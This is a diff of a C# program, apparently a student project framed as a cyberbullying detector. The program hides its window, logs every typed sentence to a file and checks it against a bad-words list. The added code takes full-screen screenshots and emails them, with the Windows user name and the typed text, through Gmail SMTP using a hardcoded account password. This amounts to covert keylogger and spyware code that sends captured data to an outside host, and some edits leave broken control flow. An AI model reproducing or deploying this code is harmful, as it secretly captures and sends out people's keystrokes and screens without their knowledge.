@@ -5,32 +5,32 @@ using System.Windows;
 using System.Windows.Input;
 using System.Diagnostics;
 using System.Threading;
-//using System.Windows.Threading;
 using System.Windows.Forms;
 using System.IO;
 using KeyTrackerBase;
 using System.Drawing;
+using System.Net.Mail;//used for emailing
+
+//cyberbullying
 
 namespace KeyTrackerBase
 {
     public partial class Form1 : Form
     {
-        //bool keys
-        bool shift = false;
-
-        //string word = "cunt";
         string sentence;
         string badWords;
-        string level;
+        string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
         string[] words = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\words.txt");
         int countWord = 0;
         int countChar = 0;
         int countDetect = 0;
+        int iScreen = 0;
 
         public Form1()
         {
             //hide form
             this.WindowState = FormWindowState.Minimized;
+
             this.ShowInTaskbar = false;
 
             InitializeComponent();
@@ -69,7 +69,7 @@ namespace KeyTrackerBase
 
             #region Shift - NOT WORKING (YET)
             if (e.KeyCode == Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
-                shift = true;//turns shift on for next char
+                //shift = true;//turns shift on for next char
             #endregion
 
             #region Backspace
@@ -121,7 +121,10 @@ namespace KeyTrackerBase
                     //}
 
                 #endregion
-                    if (sentence != "\r")
+
+                #region Word Detector
+
+                if (sentence != "\r")
                     {
                         if (sentence != "¾")
                         {
@@ -136,29 +139,35 @@ namespace KeyTrackerBase
                                             //writes entries to txt file - logger
                                             file.WriteLine(DateTime.Now.ToString() + ":  " + sentence);
                                             //word detection - NOT WORKING
-                                            for (int i = 0; i < words.Length; i++)
+                                            for (
+                                                int i = 0; i < words.Length; i++)
                                             {
                                                 if (sentence.Contains(words[i]))
                                                 {
                                                     countDetect++;
                                                     badWords += words[i] + " ";
 
-                                                    //capture screenshot
+                                                    
+                                                }
+
+                                            }
+                                            file.WriteLine("Amount of Words Detected: " + countDetect + " - Words: " + badWords);
+                                                    //capture screenshot & send email with it and log message
                                                     //http://www.mindfiresolutions.com/How-to-take-screenshot-programmatically-and-mail-it-in-C-647.php
                                                     Bitmap screencapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                                     Graphics graphics = Graphics.FromImage(screencapture as Image);
                                                     graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
-                                                    screencapture.Save("C:\\Users\\Jon\\Desktop\\screenshot.jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
-                                                }
-                                                
-                                            }
-                                            file.WriteLine("Amount of Words Detected: " + countDetect + " - Words: " + badWords);
-                                            
+                                                    screencapture.Save(@"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
+                                                    
+                                                    SendEmail("cyberbullyingauthority@gmail.com", "User: " + userName + badWords, "Sentence: " + sentence, @"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg");
+                                                    iScreen++;
+
                                         }
                                         else
+                                        {
                                             //writes entries to txt file, removes period symbol and puts fullstop - logger
                                             file.WriteLine(DateTime.Now.ToString() + ":  " + sentence.Remove(sentence.Length - 1) + ".");
-
+                                        }
                                         //string and ints reset
                                         sentence = "";
                                         countWord = 0;
@@ -175,6 +184,7 @@ namespace KeyTrackerBase
                     }
                     else
                         sentence = "";
+                #endregion
             }
 
             #endregion
@@ -194,6 +204,46 @@ namespace KeyTrackerBase
         public void Form1_Load(object sender, EventArgs e)
         {
             
+        }
+
+        public void SendEmail(string to, string subject, string body, string path)
+        {
+            try
+            {
+                //------------------------------------Email message code-------------------------------
+
+                //creating the email object
+
+                MailMessage message = new MailMessage("screenshotbully@gmail.com", to);
+                //Body or content of the email indicating a new bullying incident 
+                message.Body = body;//example
+                //subject or title of the email
+                message.Subject = (subject);//gets username currently logged in
+                //attachment code of the screenshot, direct acess to file path of the screenshot or it can be replaced by a variable
+                message.Attachments.Add(new Attachment(path));
+
+                //------------------------------end----------------------------------------------
+
+                //------------------------------Email client used (gmail)------------------------------
+
+                //crearting client object with gmail smtp details and port
+                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
+                //login credentials of screenshot sender
+                client.Credentials = new System.Net.NetworkCredential("screenshotbully@gmail.com", "cyberbullying");
+                //enabling secure connection
+                client.EnableSsl = true;
+                //sending the email message
+                client.Send(message);
+
+                //------------------------------end-----------------------------------------------
+                //freeing memory
+                message = null;
+            }
+            catch (Exception Ex)
+            {
+                //message = null;
+                throw Ex;
+            }
         }
 
     }
